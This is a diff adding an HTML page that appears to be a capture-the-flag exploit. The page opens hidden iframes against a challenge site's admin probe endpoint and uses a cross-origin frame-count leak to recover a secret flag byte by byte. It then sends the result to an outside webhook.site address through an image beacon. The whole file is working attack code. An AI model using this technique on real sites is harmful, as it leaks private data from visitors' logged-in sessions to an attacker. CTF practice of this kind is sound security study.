@@ -1,0 +1,117 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>wasmeme oracle</title>
+</head>
+<body>
+  <pre id="status">Starting wasmeme oracle…</pre>
+  <script>
+    const PROBE_ORIGIN = 'https://chall.com';
+    const EXFIL_URL = 'https://webhook.site/a419f7e6-81c0-4bf8-a368-13dc1ed82071';
+    const statusEl = document.getElementById('status');
+
+    // Test common flag characters first, then every remaining printable ASCII byte.
+    const common = 'abcdefghijklmnopqrstuvwxyz0123456789_-}';
+    const allPrintable = Array.from({ length: 95 }, (_, i) => String.fromCharCode(32 + i));
+    const ordered = [...new Set([...common, ...allPrintable])];
+    const BATCH_SIZE = 24;
+    const BATCH_TIMEOUT_MS = 12000;
+
+    function makePayload(position, guessedByte) {
+      const bytes = new Uint8Array(21);
+      bytes[16] = position & 0xff;
+      bytes[17] = (position >>> 8) & 0xff;
+      bytes[18] = (position >>> 16) & 0xff;
+      bytes[19] = (position >>> 24) & 0xff;
+      bytes[20] = guessedByte;
+      return Array.from(bytes, b => b.toString(16).padStart(2, '0')).join('');
+    }
+
+    function testBatch(position, characters) {
+      return new Promise((resolve) => {
+        const frames = [];
+        let finished = false;
+        let poll;
+        let timeout;
+
+        const finish = (result) => {
+          if (finished) return;
+          finished = true;
+          clearInterval(poll);
+          clearTimeout(timeout);
+          for (const frame of frames) frame.remove();
+          resolve(result);
+        };
+
+        for (const character of characters) {
+          const frame = document.createElement('iframe');
+          frame.setAttribute('aria-hidden', 'true');
+          frame.loading = 'eager';
+          frame.style.cssText = 'position:absolute;left:-10000px;top:0;width:1px;height:1px;border:0;';
+          frame.src = `${PROBE_ORIGIN}/admin/probe?data=${makePayload(position, character.charCodeAt(0))}`;
+          frames.push(frame);
+          document.body.appendChild(frame);
+        }
+
+        poll = setInterval(() => {
+          for (let i = 0; i < frames.length; i++) {
+            try {
+              if (frames[i].contentWindow && frames[i].contentWindow.length > 0) {
+                finish(characters[i]);
+                return;
+              }
+            } catch (_) {
+              // Navigation may still be in progress.
+            }
+          }
+        }, 50);
+
+        timeout = setTimeout(() => finish(null), BATCH_TIMEOUT_MS);
+      });
+    }
+
+    async function findCharacter(position) {
+      for (let start = 0; start < ordered.length; start += BATCH_SIZE) {
+        const batch = ordered.slice(start, start + BATCH_SIZE);
+        statusEl.textContent = `Checking byte ${position + 1}: candidates ${start + 1}–${start + batch.length}`;
+        const result = await testBatch(position, batch);
+        if (result !== null) return result;
+      }
+      return null;
+    }
+
+    function sendResult(params) {
+      const url = new URL(EXFIL_URL);
+      for (const [key, value] of Object.entries(params)) url.searchParams.set(key, value);
+      const beacon = new Image();
+      beacon.src = url.toString();
+    }
+
+    async function run() {
+      let flag = 'DH{';
+      statusEl.textContent = 'Starting flag check…';
+      try {
+        for (let position = 3; position < 64; position++) {
+          const character = await findCharacter(position);
+          if (character === null) throw new Error(`No printable byte matched at offset ${position}`);
+          flag += character;
+          statusEl.textContent = `Recovered ${flag.length} bytes`;
+          if (character === '}') {
+            statusEl.textContent = 'Completed. Sending result.';
+            sendResult({ flag });
+            return;
+          }
+        }
+        throw new Error('No closing brace found within the 64-byte flag region');
+      } catch (error) {
+        statusEl.textContent = `Error: ${error.message}`;
+        sendResult({ error: error.message, partial: flag });
+      }
+    }
+
+    run();
+  </script>
+</body>
+</html>
